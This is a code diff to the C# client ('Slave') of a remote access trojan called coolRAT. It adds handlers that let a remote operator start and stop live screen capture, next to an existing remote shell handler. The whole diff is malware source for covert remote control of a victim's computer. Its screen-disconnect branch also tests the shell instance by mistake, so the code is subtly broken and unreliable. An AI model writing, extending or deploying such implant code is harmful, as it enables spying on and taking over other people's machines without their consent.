@@ -23,8 +23,12 @@ namespace coolRAT.Slave
             Globals.LocalClient = authClient.CreateClient(authClient.RegisterClient());
             Console.WriteLine("Connected!");
             Globals.LocalClient.RegisterPacketHandler("ConnectShellPacket", Shell_PacketReceivedHandler);
-            Globals.LocalClient.ClientPingService.Start(PingServiceType.Active);
+            Globals.LocalClient.RegisterPacketHandler("DisconnectShellPacket", Shell_PacketReceivedHandler);
+
+            Globals.LocalClient.RegisterPacketHandler("ConnectScreenPacket", Screen_PacketReceivedHandler);
+            Globals.LocalClient.RegisterPacketHandler("DisconnectScreenPacket", Screen_PacketReceivedHandler);
             Globals.LocalClient.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
+            Task.Run(() => Globals.LocalClient.ClientPingService.Start(PingServiceType.Active));
 
             Globals.ScreenInstance = new RemoteScreen(Globals.LocalClient);
             Application.Run();
@@ -41,6 +45,45 @@ namespace coolRAT.Slave
                 Globals.LocalClient.Connection.StopAll();
                 Globals.LocalClient.ClientPingService.Stop();
                 Globals.LocalClient = null;
+            }
+        }
+
+        public static void Screen_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
+        {
+            if(e.Packet.Type == "ConnectScreenPacket")
+            {
+                if(Globals.ScreenInstance != null)
+                {
+                    Globals.ScreenInstance.Stop();
+                    Globals.ScreenInstance = null;
+                }
+
+                Globals.ScreenInstance = new RemoteScreen(Globals.LocalClient);
+                ScreenConnectedPacket screenConnectedPacket = new ScreenConnectedPacket(Globals.LocalClient.UniqueId, Globals.ScreenInstance.UniqueId, true);
+                Globals.LocalClient.SendPacket(screenConnectedPacket);
+
+                return;
+            }
+            if(e.Packet.Type == "DisconnectScreenPacket")
+            {
+                DisconnectScreenPacket packet = DisconnectScreenPacket.Deserialize(e.RawPacket);
+                ScreenDisconnectedPacket shellDisconnectedPacket;
+                if (Globals.ShellInstance == null)
+                {
+                    shellDisconnectedPacket = new ScreenDisconnectedPacket(Globals.LocalClient.UniqueId, packet.UniqueScreenId, false);
+                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
+                    return;
+                }
+                if (Globals.ScreenInstance.UniqueId != packet.UniqueScreenId)
+                {
+                    shellDisconnectedPacket = new ScreenDisconnectedPacket(Globals.LocalClient.UniqueId, packet.UniqueScreenId, false);
+                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
+                    return;
+                }
+                Globals.ScreenInstance.Destroy();
+                Globals.ScreenInstance = null;
+                shellDisconnectedPacket = new ScreenDisconnectedPacket(Globals.LocalClient.UniqueId, packet.UniqueScreenId, true);
+                Globals.LocalClient.SendPacket(shellDisconnectedPacket);
             }
         }
 
